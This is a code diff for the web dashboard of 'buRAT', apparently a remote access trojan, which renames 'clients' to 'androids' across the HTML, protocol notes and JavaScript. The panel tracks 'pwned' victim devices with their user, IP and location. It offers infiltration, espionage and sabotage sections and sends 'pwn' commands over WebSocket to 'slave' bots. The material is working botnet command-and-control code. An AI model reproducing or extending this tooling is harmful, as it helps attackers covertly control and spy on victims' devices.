@@ -53,7 +53,7 @@
             <ul class="nav" ui-nav>
 
               <li class="nav-header hidden-folded">
-                <small class="text-muted">CLIENTS</small>
+                <small class="text-muted">ANDROIDS</small>
               </li>
 
               <li>
@@ -63,7 +63,7 @@
                       <span ui-include="'../flatkit113/assets/images/i_3.svg'"></span>
                     </i>
                   </span>
-                  <span class="nav-text" id="nav-clients">Clients</span>
+                  <span class="nav-text" id="nav-androids">Androids</span>
                 </a>
               </li>
 
@@ -376,16 +376,16 @@
 
         <div class="padding">
 
-          <div class="box" id="box-clients">
+          <div class="box" id="box-androids">
             <div class="box-header">
-              <h2>Clients</h2>
+              <h2>Androids</h2>
               <small>pwned by oninymous</small>
             </div>
             <div class="box-body dker">
               Search: <input id="filter" type="text" class="form-control input-sm w-auto inline m-r"/>
             </div>
             <div>
-              <table id="table-pwned-clients" class="table m-b-none" ui-jp="footable" data-filter="#filter" data-page-size="5">
+              <table id="table-pwned-androids" class="table m-b-none" ui-jp="footable" data-filter="#filter" data-page-size="5">
                 <thead>
                   <tr>
                     <th>ID</th>
@@ -401,8 +401,8 @@
                   </tr>
                 </thead>
                 <tbody>
-                  <script id="template-client" type="mustache-template">
-                  <tr id="tr-client-{{id}}" class="tr-client">
+                  <script id="template-android" type="mustache-template">
+                  <tr id="tr-android-{{id}}" class="tr-android">
                     <td class="td-id">{{id}}</td>
                     <td class="td-name">{{name}}</td>
                     <td class="td-computer">{{computer}}</td>
@@ -425,7 +425,7 @@
                                   <a class="nav-link block a-settings" href data-toggle="tab" data-target="#tab-2">Settings</a>
                                 </li>
                                 <li class="nav-item">
-                                  <a class="nav-link block a-settings" href data-toggle="tab" data-target="#tab-3">asd</a>
+                                  <a class="nav-link block a-settings" href data-toggle="tab" data-target="#tab-3">Tools</a>
                                 </li>
                               </ul>
                             </div>
@@ -463,11 +463,11 @@
                   <div class="box no-border m-b-xs div-inator">
                     <div class="box-header p-y-sm">
                       <span class="pull-right label text-sm span-inator-code">{{inator.code}}</span>
-                      <a class="a-inator-name" data-toggle="collapse" data-parent="#accordion-{{client.id}}" data-target="#c-{{client.id}}-{{inator.code}}">
+                      <a class="a-inator-name" data-toggle="collapse" data-parent="#accordion-{{android.id}}" data-target="#c-{{android.id}}-{{inator.code}}">
                         {{inator.name}}
                       </a>
                     </div>
-                    <div id="c-{{client.id}}-{{inator.code}}" class="collapse inator-{{client.code}}">
+                    <div id="c-{{android.id}}-{{inator.code}}" class="collapse inator-{{inator.code}}">
                       <div class="box-body">
                           <div class="form-group row">
                             <div class="col-sm-12">
@@ -564,23 +564,23 @@
                 g
 
 1. Server - buRAT server
-2. Client - buRAT clients
+2. Androids - buRAT androids
   a. Slave - bots
   b. Master - remote control
 
-clients - list of clients
-client - client details
+androids - list of androids
+android - android details
 data - data from the slaves (sent to master)
 pwn - command from the master (sent to slaves)
-pipe - pipe data to other clients
+pipe - pipe data to other androids
 config - set slave configuration
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Slave                      | Server                      | Master
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                            | clients-rxtx                | rxtx-clients
- client-tx                  | rx-client                   | tx-client
-                            | client-tx                   | rx-client
+                            | androids-rxtx                | rxtx-androids
+ android-tx                  | rx-android                   | tx-android
+                            | android-tx                   | rx-android
  data-tx                    | rxtx-data-rxtx              | rxtx-data
  pwn-rx                     | rxtx-pwn-rxtx               | rxtx-pwn
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -591,8 +591,8 @@ config - set slave configuration
 {"header":"", "payload":"", "trailer":""}
 
 android = {"id": "", "type": "", "name": "", "computer": "", "user": "", "os": "", "ip": "", "country": "", "city": "", "inators": [{"code": "", "name": ""}]}
-pwn = {"client":"", "inator":"", "data":""}
-data = {"client":"", "inator":"", "data":""}
+pwn = {"android":"", "inator":"", "data":""}
+data = {"android":"", "inator":"", "data":""}
 
 #INATOR PROTOCOL
 0000 SETTINGS
@@ -678,7 +678,7 @@ data = {"client":"", "inator":"", "data":""}
 */
 server = "ws://" + window.document.location.host + "/";
 identification = {
- "header":"client",
+ "header":"android",
  "payload":{
     "id":"1",
     "type":"Master",
@@ -725,24 +725,24 @@ if ("WebSocket" in window) {
       console_(trailer);
       console.log(trailer);
 
-      if(header == "clients"){ //DEATHNOTE
-        clients = payload;
-        $.each(clients, function(i, client) {
-          if(client.type == "Slave")
-            client_(client);
+      if(header == "androids"){ //DEATHNOTE
+        androids = payload;
+        $.each(androids, function(i, android) {
+          if(android.type == "Slave")
+            android_(android);
         })
-      }else if(header == "client_status"){ //CLIENT
-        client = payload;
-        if(client.type == "Slave")
-          client_(client);
+      }else if(header == "android"){ //ANDROID
+        android = payload;
+        if(android.type == "Slave")
+          android_(android);
       }else if(header == "data"){ //DATA
-        client = payload['client'];
+        android = payload['android'];
         inator = payload['inator'];
         data = payload['data'];
         trailer = packet['trailer'];
         console.log(payload);
-        inator_(client, inator, trailer);
-        process_(client, inator, data);
+        inator_(android, inator, trailer);
+        process_(android, inator, data);
       }
     }
     catch(err) {
@@ -760,39 +760,39 @@ if ("WebSocket" in window) {
 }
 
 /*
-*   Client
+*   Android
 */
-function client_(client){
-  dom = $("#tr-client-" + client.id);
+function android_(android){
+  dom = $("#tr-android-" + android.id);
 
   if(dom.length){
 
-    dom.find("td.td-name").text(client.name);
-    dom.find("td.td-computer").text(client.computer);
-    dom.find("td.td-user").text(client.user);
-    dom.find("td.td-os").text(client.os);
-    dom.find("td.td-ip").text(client.ip);
-    dom.find("td.td-country").text(client.country);
-    dom.find("td.td-city").text(client.city);
-    dom.find("td.td-status").text(client.status);
+    dom.find("td.td-name").text(android.name);
+    dom.find("td.td-computer").text(android.computer);
+    dom.find("td.td-user").text(android.user);
+    dom.find("td.td-os").text(android.os);
+    dom.find("td.td-ip").text(android.ip);
+    dom.find("td.td-country").text(android.country);
+    dom.find("td.td-city").text(android.city);
+    dom.find("td.td-status").text(android.status);
 
-    $.each(client.inators, function(i, inator) {
-      if($("#c-" + client.id + "-" + inator.code).length == 0){
-        var context = {client:{id:client.id},inator:{code:inator.code, name:inator.name}}
+    $.each(android.inators, function(i, inator) {
+      if($("#c-" + android.id + "-" + inator.code).length == 0){
+        var context = {android:{id:android.id},inator:{code:inator.code, name:inator.name}}
         var source   = $('#template-inator').html();
         var template = Handlebars.compile(source);
         var html = template(context);
 
-        $('body').find("#accordion-" + client.id).append(html)
+        $('body').find("#accordion-" + android.id).append(html)
       }
     })
 
-    $(".inator-" + client.id).each(function(index) {
+    $(".inator-" + android.id).each(function(index) {
       id = $(this).attr("id");
       meron = false;
       newname = '';
-      $.each(client.inators, function(i, inator) {
-        search = "c-" + client.id + "-" + inator.code;
+      $.each(android.inators, function(i, inator) {
+        search = "c-" + android.id + "-" + inator.code;
         if(search == id){
           meron = true;
           newname = inator.name;
@@ -807,31 +807,31 @@ function client_(client){
 
   }else{
 
-    var context = client
-    var source   = $('#template-client').html();
+    var context = android
+    var source   = $('#template-android').html();
     var template = Handlebars.compile(source);
     var html = template(context);
 
-    $("#table-pwned-clients tbody").append(html); //append client template
-    $("#table-pwned-clients").trigger("footable_initialize"); //init table
+    $("#table-pwned-androids tbody").append(html); //append android template
+    $("#table-pwned-androids").trigger("footable_initialize"); //init table
 
-    $.each(client.inators, function(i, inator) {
-      if($("#c-" + client.id + "-" + inator.code).length == 0){
-        var context = {client:{id:client.id},inator:{code:inator.code, name:inator.name}}
+    $.each(android.inators, function(i, inator) {
+      if($("#c-" + android.id + "-" + inator.code).length == 0){
+        var context = {android:{id:android.id},inator:{code:inator.code, name:inator.name}}
         var source   = $('#template-inator').html();
         var template = Handlebars.compile(source);
         var html = template(context);
 
-        $('body').find("#accordion-" + client.id).append(html)
+        $('body').find("#accordion-" + android.id).append(html)
       }
     })
 
-    $(".inator-" + client.id).each(function(index) {
+    $(".inator-" + android.id).each(function(index) {
       id = $(this).attr("id");
       meron = false;
       newname = '';
-      $.each(client.inators, function(i, inator) {
-        search = "c-" + client.id + "-" + inator.code;
+      $.each(android.inators, function(i, inator) {
+        search = "c-" + android.id + "-" + inator.code;
         if(search == id){
           meron = true;
           newname = inator.name;
@@ -868,8 +868,8 @@ $("#input-console").on('keyup', function (e) { //input
 /*
 *   Inator
 */
-function inator_(client, inator, trailer){ //textarea
-  dom = $("#c-" + client + "-" + inator).find(".textarea-inator");
+function inator_(android, inator, trailer){ //textarea
+  dom = $("#c-" + android + "-" + inator).find(".textarea-inator");
   if(dom.length){
     data = dom.text() + trailer;
     dom.text(data);
@@ -879,12 +879,12 @@ function inator_(client, inator, trailer){ //textarea
 
 $(document).on("keyup", ".input-inator", function (e) { //input
   if (e.keyCode == 13) {
-    client = $(this).closest("tr").prev().find(".td-id").text();
+    android = $(this).closest("tr").prev().find(".td-id").text();
     inator = $(this).closest(".box").find(".span-inator-code").text();
     data = $(this).val();
 
     header = "pwn";
-    payload = {"client": client, "inator": inator, "data": data};
+    payload = {"android": android, "inator": inator, "data": data};
     trailer = "pwned";
 
     packet = {"header": "pwn", "payload": payload, "trailer" : trailer};
@@ -897,14 +897,14 @@ $(document).on("keyup", ".input-inator", function (e) { //input
 /*
 *   Process Data
 */
-function process_(client, inator, data){
+function process_(android, inator, data){
 
 }
 
 /*
 *   Navigations
 */
-$("#box-clients").hide();
+$("#box-androids").hide();
 $("#box-infiltration").hide();
 $("#box-espionage").hide();
 $("#box-sabotage").hide();
@@ -912,9 +912,9 @@ $("#box-settings").hide();
 $("#box-documentation").hide();
 $("#box-about").hide();
 
-$("#nav-clients").click(function(){
-  ws.send('{"header": "clients"}');
-  $("#box-clients").show();
+$("#nav-androids").click(function(){
+  ws.send('{"header": "androids"}');
+  $("#box-androids").show();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
   $("#box-sabotage").hide();
@@ -924,7 +924,7 @@ $("#nav-clients").click(function(){
 });
 
 $("#nav-infiltration").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").show();
   $("#box-espionage").hide();
   $("#box-sabotage").hide();
@@ -934,7 +934,7 @@ $("#nav-infiltration").click(function(){
 });
 
 $("#nav-espionage").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").hide();
   $("#box-espionage").show();
   $("#box-sabotage").hide();
@@ -944,7 +944,7 @@ $("#nav-espionage").click(function(){
 });
 
 $("#nav-sabotage").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
   $("#box-sabotage").show();
@@ -954,7 +954,7 @@ $("#nav-sabotage").click(function(){
 });
 
 $("#nav-settings").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
   $("#box-sabotage").hide();
@@ -964,7 +964,7 @@ $("#nav-settings").click(function(){
 });
 
 $("#nav-documentation").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
   $("#box-sabotage").hide();
@@ -974,7 +974,7 @@ $("#nav-documentation").click(function(){
 });
 
 $("#nav-about").click(function(){
-  $("#box-clients").hide();
+  $("#box-androids").hide();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
   $("#box-sabotage").hide();
